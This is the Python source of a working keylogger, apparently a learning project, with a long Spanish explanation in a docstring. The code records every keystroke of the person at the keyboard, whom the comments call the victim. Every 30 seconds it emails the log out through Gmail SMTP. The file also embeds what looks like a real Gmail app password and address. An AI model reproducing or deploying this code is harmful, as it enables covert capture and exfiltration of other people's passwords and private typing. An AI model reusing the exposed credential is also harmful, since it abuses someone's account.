#!/usr/bin/env python3

import pynput.keyboard 
import threading
import smtplib
from email.mime.text import MIMEText


class Keylogger:

    def __init__(self):
        self.log = ""
        self.shutdown_request = False
        self.timer = None
        self.is_first_run = True


    # Metodos
    def pressed_key(self, key):

        try:
            self.log += str(key.char)  

        except AttributeError:
            special_keys = {key.space: " ", key.backspace: " 'Backspace' ", key.enter: " 'Enter' ", key.shift: " 'Shift' ",key.ctrl: " 'Ctrl' ", key.alt: " 'Alt' ", "None1": " | ", "None2": " @ ", key.delete: " 'Suprimir' ", key.left: " 'Flecha Derecha' ", key.right: " 'Fleha Izquierda' ", key.down: " 'Flecha Abajo' ", key.up: " 'Flecha Arriba' "} 

            self.log += special_keys.get(key, f" {str(key)} ")

        print(self.log)


    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server: # Creatin the conection
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        
        print(f"[+] Emails sent Successfully!!")

    # Recursive Function
    def report(self):
        email_body = "[+] Keyl logger has been successfully started" if self.is_first_run else self.log
        self.send_email("Keylogger Report", email_body, "yourE-mail@gmail.com", ["yourE-mail@gmail.com"], "jvfd cnyh uvap svwo")
        self.log = ""

        if self.is_first_run:
            self.is_first_run = False
        
        if not self.shutdown_request:
            self.timer = threading.Timer(30, self.report)
            self.timer.start()

    def shutdown(self):
        self.shutdown_request = True

        if self.timer:
            self.timer.cancel()

    def start(self):
        # Listen
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)

        with keyboard_listener:
            self.report()
            keyboard_listener.join() # Start

"""
EXPLICACIÓN:

PREVIA CONFIGURACIÓN:  

    Tener cueta de gmail.com con el factor de autentificación hecho, y luego conseguir contraseña de aplicación, en el apartado de seguridad

1- keyboad_listenen = pynput.keyboard.Listener() -> Creando una isntancia de la clase
2- with keyboard_listener: -> El manejador de contexto lo usamos para si hay algun error y pete no quiero que se quede todo el rato ejecutasndose que me lo finalize sin que tener yo estar pendiente.
keyboard_listener.jion() # Start -> Lo que hacemos es iniciar-lo  

4- Estamos intentado que el valor de log sea la key(letra que pulsamos).char para decirle que es una caracter, en el momento que no es un caracter por ejemplo: key.space nos dara Error, para controlar el error tenemos
un Except que si se da el caso de no ser un caracter interpreta la tecla pulsada.
Lo que estamos haciendo es hacer un dicionario que tenga una key y value con todas las posibles teclas que pueda tocar el usuario o victima para poder saber en todo momento la tecla que se presiona, luego estamos sumando al log el valor de esta tecla que no es un caracter
y con special_keys.get(key, f"{str(key)}") estamos cojiendo el valor de la key que esta en el diccionario y sumandola al log, depues si la victima le da a una tecla que nosotros no la tenemos en el diccionario que aparezca la trecla pero sin nuestro formato de representacion que vemos en el especial_keys 
    try:
        self.log += str(key.char)  

    except AttributeError:
        special_keys = {key.space: " ", key.backspace: " 'Backspace' ", key.enter: " 'Enter' ", key.shift: " 'Shift' ",key.ctrl: " 'Ctrl' ", key.alt: " 'Alt' " }

        self.log += special_keys.get(key, f" {str(key)} ")

        5- La utilidad de esta función recursiva es que coje la propiedad log del constructor para trabajar con ella y luego la vacia, con el timer cada 5 segundo la vuelve a llamar a la función report() si el estado boleano es False(quiere decir que no se ha presionado Ctrl+C), para que se vacie el log
,de esta manera se nos limpia la pantalla cada 5s. 
La parte del correo estamos haciendo una variable que diga que se ha iniciado correctamente el keylogger si el estado bolean es True para saber que es la primera vez que se inicia de lo contraio que muestre el contenido de log que son las pulsaciones hechas por la victima,
Luego le pasamos lo campos que requiere la funcion de send_mail(), luego enviamos el email y vaciamos la variable log para enviar otra vez datos depues pasamos el is_first_run a False si es positivo.

    def report(self):
        email_body = "[+] Keyl logger has been successfully started" if self.is_first_run else self.log
        self.send_email("Keylogger Report", email_body, "heplay18@gmail.com", ["heplay18@gmail.com"], "jvfd cnyh uvap svwo ")
        self.log = ""

        if self.is_first_run:
            self.is_first_run = False
        
        if not self.shutdown_request:
            self.timer = threading.Timer(30, self.report)
            self.timer.start()


6- Este metodo de la clase Keylogger sirve para cerrar el programa de manera correcta y que no se quede nada en segundo plano, estamos poniendo la propiedad en true si se presiona Ctrl+C por lo cual
se parara el keylogger, que pasa que sigue habiendo un hilo que se ejecuta por el timer de 5 segundos, pues como tenemos una propiedad que es Igual a self.timer = None(quiere decir que no tiene contenido), pues le decimos oye si tu tienes contenido
quiero que me hagas lo siguiente -> self.timer.cancel() para poder cancerla el hilo de manera correcta. Porque cuando hace Ctrl+C tienes que esperar a los 5 segundos
    def shutdown(self):
        self.shutdown_request = True

        if self.timer:
            self.timer.cancel()



"""